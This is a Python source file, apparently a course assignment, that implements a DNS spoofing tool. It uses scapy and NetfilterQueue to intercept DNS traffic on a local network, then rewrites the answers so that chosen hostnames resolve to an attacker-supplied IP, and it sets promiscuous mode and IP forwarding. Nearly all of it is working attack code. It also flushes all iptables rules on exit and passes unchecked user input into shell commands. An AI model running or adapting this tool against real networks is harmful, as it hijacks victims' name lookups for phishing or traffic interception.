"""
Author: Mariya Pasheva
OS: Manjaro (systemd) Linux 5.4

Running:

    >> python dnsinject.py [-i interface] [-h hostnames]•
        -i:Listen on network device interface (e.g.,eth0).
           If not specified, your program should select a default interface to listen on.  
           The same interface should be used for injecting forged packets.
        -h:Read a hostname file containing a list of IP address and hostname pairs 
           specifying the hostnames to be hijacked.  If ‘-h‘ is not specified, 
           your injector should forge replies for all observed requests with 
           the local machine’s IP address as an answer

            <hostfile>
            IP to be returned in the response | The website to be hijacked
                        10.6.6.6                       foo.example.com

        
Example:
                Enabling promiscuous mode
                Promiscuous mode is on

                        ===> DNS Injection Running <===

                                >>> QUERY <<<
                
                        name  'www.cs.uic.edu.' 
                        type  A 
                        class  IN

                >>> SOURCE AND DESTINATION <<<

                Source: 192.168.0.9:41445
                Destination: 75.75.75.75:53

                >>> HEADER <<<

                ID  59167 
                Flags =>  
                        QR  0 
                        OPCODE  0 
                        Truncation  0 
                        Recursion Desired  1 
                        Recursion Available 0 
                        Z  0 
                        Answer authanticated  1 
                        Checking data  0 
                Questions:  1 
                Answers RR:  0 
                Authority RR 0 
                Additional RR: 1
                ======================> PACKAGE <=========================

                                >>> ANSWER <<<
                
                        name  'www.cs.uic.edu.' 
                        type  A 
                        class  IN 
                        alive time 0 
                        length  None 
                        data (IP) 96.96.96.96

                >>> SOURCE AND DESTINATION <<<

                Source: 75.75.75.75:53
                Destination: 192.168.0.9:41445

                >>> HEADER <<<

                ID  59167 
                Flags =>  
                        QR  1 
                        OPCODE  0 
                        Truncation  0 
                        Recursion Desired  1 
                        Recursion Available 1 
                        Z  0 
                        Answer authanticated  0 
                        Checking data  0 
                Questions:  1 
                Answers RR:  1 
                Authority RR 0 
                Additional RR: 1
                ======================> PACKAGE <=========================





Notes:
    * DNS packets, to make your code efficient you can apply a filters
      for the packets you intercept. 
    * Header  values  in  the  request  and  the  response. 
      Some  will  remain  the  same  whilethe others will be flipped. 
      You will also have to add the IP in the response from the hostname file (ifprovided).
    * DNS uses the TXID and source port randomization to make guessing hard.  
      With the vantage point of anon-path attacker you are able to see both these these
    * You can force requests to non-existent DNS resolvers.  
      In such a case a legitimate responsewill never arrive and if your forged response 
      is accepted by the DNS lookup tool, you know you have crafted asuccessful packet.


DNS

|+---------------------+|        
        Header             Transaction ID has to be the same
|+---------------------+|
       Question            Question for the name server  ls
|+---------------------+|        
        Answer             Answers to the question DNSRR
|+---------------------+|      
       Authority       
|+---------------------+|      
        Additional     
|+---------------------+|



Dependencies:
        scapy
        ip link
        /sys/class/net (Linux OS)
        netstat 
        netfilterqueue (ip tables)



"""

import scapy
import re
import os
import sys
from scapy import packet
from scapy.all import *
from scapy.packet import *
from scapy.layers.dns import *
from scapy.layers import *
from netfilterqueue import NetfilterQueue





"""
 Setting the interface to promiscuous mode
 in order to be able to capture all the traffic on the network. 

 Requires sudo privallages. 

  BMRU => BMPRU   =>P flag is set

"""
def check_promiscuouc_mode(interface):
        check_flag = 'netstat -i | grep -i ' + interface
        stream = os.popen(check_flag)
        output = stream.readlines()
        output = output[0].split()
        
        if 'P' in output[-1:][0]:
                print("Promiscuous mode is on")
        else:
                print("Promiscuous mode is off")





def set_ip_forward(set):
    with open('/proc/sys/net/ipv4/ip_forward','w') as f:
        if set:
                f.write('1')
        else:
                f.write('0')



def set_promiscuous_mode(interface, set):
        
        cmd_promisc = 'sudo ip link set ' + interface

        if set:
                promisc_on = cmd_promisc + ' promisc on'
                os.system(promisc_on)

                check_promiscuouc_mode(interface)
        else:
                promisc_off = cmd_promisc + ' promisc off'
                os.system(promisc_off)

                check_promiscuouc_mode(interface)


"""
 By default two args are needed

        >> python dnsinject.py [-i interface] [-h hostnames]

"""
def parse_arguments():


        # list of the arguments given
        args = sys.argv[1:]

        # parsing by the -i or -h flags in that order
        # return [(option,value)] => [('-i', 'wlan0'), ('-h', 'hostnames')]
        # if no argument option is porvided the pair is left empty
        pair_args, temp = getopt.getopt(args,"i:h:") 
        

        if len(pair_args) == 2:
                interface = set_interface(pair_args[0])
                hostnames = set_hostnames(pair_args[1])
        else:
                if len(pair_args) == 0:
                        interface = set_interface([])
                        hostnames = set_hostnames([])
                elif pair_args[0][0][1] == 'i':
                        interface = set_interface(pair_args[0])
                        hostnames = set_hostnames([])
                else:
                        interface = set_interface([])
                        hostnames = set_hostnames(pair_args[0])

        return interface, hostnames



"""
-i:Listen on network device interface (e.g.,eth0).
           If not specified, your program should select a default interface to listen on.  
           The same interface should be used for injecting forged packets.


 Default: if no interface is porvided will be a wireless one, if not existant, then wired one.
"""
def set_interface(interface)->str:

        if len(interface) == 2:
                interface = interface[1]
                return interface
        else: 
                #outputting all interfaces available
                # "ens12u1u2  lo  wlp2s0"
                stream = os.popen('ls /sys/class/net/')
                interfaces = stream.readlines()

                wireless = [interface for interface in interfaces if interface[0] == 'w']
                
                if len(wireless)>0:
                        wireless = wireless[0][:-1]
                        return wireless
                else:
                        enthernet = [interface for interface in interfaces if interface[0] == 'e']
                        enthernet = enthernet[0][:-1]
                        return enthernet
                
                                



"""
-h:Read a hostname file containing a list of IP address and hostname pairs 
           specifying the hostnames to be hijacked.  If ‘-h‘ is not specified, 
           your injector should forge replies for all observed requests with 
           the local machine’s IP address as an answer

        <hostfile>
            IP to be returned in the response | The website to be hijacked
                        10.6.6.6                       foo.example.com

"""
def set_hostnames(hostnames):
        

        hosts = dict()

        if len(hostnames) == 2:
                cmd = 'cat ' + hostnames[1]
                stream = os.popen(cmd)
                hostnames = stream.readlines()
                
                for  i in range(len(hostnames)):
                        name = hostnames[i].split(",")[1]
                        if name[-1:] == '\n':
                                name  = name[:-1]

                        hosts[name] = hostnames[i].split(",")[0]
        else:
                hosts['*'] = '172.217.8.206'
        return hosts



hostnames = dict()
interface = ""
interface, hostnames = parse_arguments()

"""

 The sniffed packets.



                                       1  1  1  1  1  1
         0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+|                      
                                ID                             
        |+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+|
        |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE         
        |+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+| 
                            QDCOUNT                    
        |+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+|                    
                            ANCOUNT                    
        |+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+|                    
                             NSCOUNT                    
        |+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+|                    
                             ARCOUNT                    
        |+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+|

 >>> ls(DNS)                                                                                                           
        length     : ShortField (Cond)                   = (None)
        id         : ShortField                          = (0)   Has to be the same as the original query.
        qr         : BitField (1 bit)                    = (0)   Query (0) Response (1)
        opcode     : BitEnumField (4 bits)               = (0)   Type of query 0
        aa         : BitField (1 bit)                    = (0)   Authorative(1) Not Authorative(0)
        tc         : BitField (1 bit)                    = (0)   Truncated
        rd         : BitField (1 bit)                    = (1)   Recursion desired    
        ra         : BitField (1 bit)                    = (0)   Recursion available
        z          : BitField (1 bit)                    = (0)   
        ad         : BitField (1 bit)                    = (0)   Answer authenticated 0
        cd         : BitField (1 bit)                    = (0)   Non-aunthenticated data accept 1
        rcode      : BitEnumField (4 bits)               = (0)   No error condition
        qdcount    : DNSRRCountField                     = (None)  no question follow
        ancount    : DNSRRCountField                     = (None)  no answers follow
        nscount    : DNSRRCountField                     = (None)  no records follow
        arcount    : DNSRRCountField                     = (None)  no additional records follow
        qd         : DNSQRField                          = (None)
        an         : DNSRRField                          = (None)
        ns         : DNSRRField                          = (None)
        ar         : DNSRRField                          = (None)
 >>> ls(DNSQR)                                                                                                         
        qname      : DNSStrField                         = (b'www.example.com')
        qtype      : ShortEnumField                      = (1)
        qclass     : ShortEnumField                      = (1)
 >>> ls(DNSRR)                                                                                                         
        rrname     : DNSStrField                         = (b'.')
        type       : ShortEnumField                      = (1)
        rclass     : ShortEnumField                      = (1)
        ttl        : IntField                            = (0)
        rdlen      : FieldLenField                       = (None)
        rdata      : MultipleTypeField                   = (b'')                                                                                                                


"""
def sniff_dns(packet):

        #Flushing cache 
        os.system('sudo systemd-resolve --flush-caches')

        pkt = IP(packet.get_payload())
        valid_ip = 'none'

        output_pkt = 0


        if DNS in pkt and (DNSQR in pkt or DNSRR in pkt) and (UDP in pkt or IP in pkt):

                ip_layer = pkt['IP']
                udp_layer = pkt['UDP']

                src_ip = ip_layer.src
                src_port = udp_layer.sport
                dst_ip = ip_layer.dst
                dst_port = udp_layer.dport


                dns_layer = pkt['DNS']

                #Declaring fields of the request layer. 
                dnsqr_layer = pkt['DNS']['DNSQR']
                qtype_field = dnsqr_layer.get_field('qtype')
                qname_field = dnsqr_layer.get_field('qname')
                qclass_field = dnsqr_layer.get_field('qclass')
                req_A_type = str(qtype_field.i2repr(dnsqr_layer, dnsqr_layer.qtype)) 
                req_name = str(qname_field.i2repr(dnsqr_layer, dnsqr_layer.qname))

                value_ip = hostnames.get(req_name[1:-2], 'none')
                print(value_ip)


                if DNSQR in pkt and int(dst_port) == 53 and dns_layer.qr == 0 and value_ip != 'none':


                        if req_A_type == 'A' and value_ip != 'none': #and ( host_ip in str(req_name)):
                                output_pkt = 1

                                print(
                                "\n\t\t >>> QUERY <<<\n",
                                "\n\t name ",  qname_field.i2repr(dnsqr_layer, dnsqr_layer.qname),
                                "\n\t type ", qtype_field.i2repr(dnsqr_layer, dnsqr_layer.qtype),
                                "\n\t class ", qclass_field.i2repr(dnsqr_layer, dnsqr_layer.qclass)
                                )

                if (src_port) == 53 and value_ip != 'none':
                                bad_ip = str(value_ip)
                                print(bad_ip)

                                qname = pkt[DNSQR].qname
                                dns_response = DNSRR(rrname=qname, type='A', rdata=bad_ip, rclass=0x0001)
                                dns_layer.an = dns_response
                                dns_layer.ancount = 1
                                packet.set_payload(bytes(pkt))

                                del ip_layer.len
                                del ip_layer.chksum
                                del udp_layer.len
                                del udp_layer.chksum


                                for i in range(int(dns_layer.ancount)):

                                        dnsrr_layer = pkt['DNS'].an[i]

                                        rrname_filed = dnsrr_layer.get_field('rrname')
                                        type_field = dnsrr_layer.get_field('type')
                                        rclass_field = dnsrr_layer.get_field('rclass')
                                        ttl_field = dnsrr_layer.get_field('ttl')
                                        len_field = dnsrr_layer.get_field('rdlen')


                                        try:
                                               rdata_filed = dnsrr_layer.rdata
                                        except AttributeError or KeyError:
                                                # res_data = 'None'
                                                pass
                                        else:
                                                try:
                                                        rdata_field = dnsrr_layer.get_field('rdata')
                                                except KeyError:
                                                        res_data = '127.0.0.1'
                                                        pass
                                                else:
                                                        rdata_field = dnsrr_layer.get_field('rdata')
                                                        res_data = str(rdata_field.i2repr(dnsrr_layer, dnsrr_layer.rdata))
                                
                                        

                                        res_name = str(rrname_filed.i2repr(dnsrr_layer, dnsrr_layer.rrname))
                                        res_A_type = str(type_field.i2repr(dnsrr_layer, dnsrr_layer.type))
                                        res_class = str(rclass_field.i2repr(dnsrr_layer, dnsrr_layer.rclass))
                                        res_ttl = str(ttl_field.i2repr(dnsrr_layer, dnsrr_layer.ttl))
                                        res_len = str(len_field.i2repr(dnsrr_layer, dnsrr_layer.rdlen))
                                


                                        if value_ip != 'none': # and value_ip in str(res_name)): #and res_A_type == 'A':
                                                output_pkt = 1

                                                print("\n\t\t >>> ANSWER <<<\n",
                                                "\n\t name ", res_name,
                                                "\n\t type ", res_A_type,
                                                "\n\t class ", res_class,
                                                "\n\t alive time", res_ttl,
                                                "\n\t length ", res_len,
                                                "\n\t data (IP)", res_data
                                                )

        if(output_pkt):
                print("\n>>> SOURCE AND DESTINATION <<<")
                print("\nSource: " + str(src_ip) + ":" + str(src_port)
                        + "\nDestination: " + str(dst_ip) + ":" + str(dst_port))


                print("\n>>> HEADER <<<")
        
                print("\nID ", dns_layer.id,
                "\nFlags => ",
                "\n\tQR ", dns_layer.qr,
                "\n\tOPCODE ", dns_layer.opcode,
                "\n\tTruncation ",dns_layer.tc,
                "\n\tRecursion Desired ",dns_layer.rd,
                "\n\tRecursion Available",dns_layer.ra,
                "\n\t Z ", dns_layer.z,
                "\n\t Answer authanticated ", dns_layer.ad,
                "\n\t Checking data ",dns_layer.cd,
                "\nQuestions: ", dns_layer.qdcount,
                "\nAnswers RR: ", dns_layer.ancount,
                "\nAuthority RR", dns_layer.nscount,
                "\nAdditional RR:", dns_layer.arcount,
                )
                print("======================> PACKAGE <=========================")

        #Flushing cache 
        os.system('sudo systemd-resolve --flush-caches')

        packet.set_payload(bytes(pkt))
        packet.accept()




def main():

        print("Interface: " , interface, "\nHostnames: ", hostnames) 

        print("\nEnabling promiscuous mode")
        set_promiscuous_mode(interface, True)
        set_ip_forward(True)

        # sniff(iface=interface, filter="udp and port 53", prn = sniff_dns, store=0)


        sniffer = NetfilterQueue()
        sniffer.bind(1, sniff_dns)   
        try:
                os.system("sudo systemd-resolve --flush-caches")
                os.system("sudo iptables -A INPUT -i %s -p udp --sport 53 -j NFQUEUE --queue-num 1" %(interface))
                os.system("sudo iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 1")
                print("\n\t ===> DNS Injection Running <===")
                sniffer.get_fd()
                sniffer.run()

        except KeyboardInterrupt:
                os.system("sudo iptables -F")
                print("\n\t ===> DNS Injection Interupted <===")


        print("\n Disabling promiscuous mode")
        set_promiscuous_mode(interface, False)
        set_ip_forward(False)

main()

